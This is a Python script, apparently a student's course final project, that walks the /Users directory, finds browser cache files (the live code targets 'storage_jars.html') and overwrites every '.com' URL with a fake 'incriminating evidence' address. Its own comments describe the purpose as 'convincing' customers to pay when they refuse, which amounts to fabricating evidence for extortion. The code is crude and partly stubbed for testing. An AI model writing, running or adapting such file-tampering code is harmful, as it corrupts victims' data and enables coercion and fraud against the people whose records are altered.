# payment_plan.py
#
# Will MacLean
# CSPP 51060
# Final Project

# This reads opens all _CACHE_00x_ files, and replaces all "www.*.com" strings
# with incriminating evidence. You use it to "convince" your customers to pay
# up when they refuse.

import subprocess
import sys
import re
import os

# variables, for ease of editing
main_dir = "/Users"
incriminating_evidence = "http://www.you_are_like_so_TOTALLY_busted.com"

# files
#files = ["_CACHE_001_", "_CACHE_002_", "_CACHE_003_"]
files = ["storage_jars.html"]

# attempt to read directories from entire system
find_dir = subprocess.Popen(['find', '.', '-print'], stdout = subprocess.PIPE, cwd = main_dir)
dirs = find_dir.stdout.read()

# split data into paths and check to see if they have "_CACHE_MAP_"
file_paths = dirs.split()
#reg_cache = re.compile('_CACHE_MAP_')
reg_cache = re.compile('storage_jars.html')
cache_paths = []
for path in file_paths:
        if (reg_cache.search(path)):
                if (path == '2/storage_jars.html'): # dunno where this is coming from
                        pass
                else:
                        temp = path.rstrip('storage_jars.html')
                        temp = main_dir + temp.lstrip('.')
                        cache_paths.append(temp)

# set up regular expressions
re_nnpxxx = re.compile("http://(.*?).com{1}")

# run through all files and filepaths
for path in cache_paths:
	os.chdir(path)
	str = ""
	for file in files:
		#str = ""
		a = 0
		f_in = open(file, "r")
		#str = re_nnpxxx.sub(incriminating_evidence, f_in)
		for line in f_in:
			temp = re_nnpxxx.sub(incriminating_evidence, line)
			str = str + temp
		#	newline = re_nnpxxx.sub(incriminating_evidence, line)
		#	print newline
		#	str = str + newline
		f_in.close()
		f_out = open(file, "w")
		f_out.write(str)
		f_out.close()


#newStr = re_nnpxxx.sub(incriminating_evidence, str)



